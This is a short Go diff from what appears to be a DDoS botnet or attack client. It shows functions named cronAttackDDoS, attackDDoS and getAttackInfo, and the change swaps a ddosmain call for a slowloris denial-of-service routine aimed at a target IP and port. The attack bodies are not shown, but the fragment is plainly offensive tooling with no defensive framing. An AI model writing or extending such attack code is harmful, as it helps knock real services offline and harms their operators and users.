@@ -80,7 +80,8 @@ func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
 }
 
 func attackDDoS(ip string, port string) {
-	ddosmain(ip + ":" + port)
+//	ddosmain(ip + ":" + port)
+	slowloris(ip + ":" + port)
 }
 
 func getAttackInfo(url string, target interface{}) error {
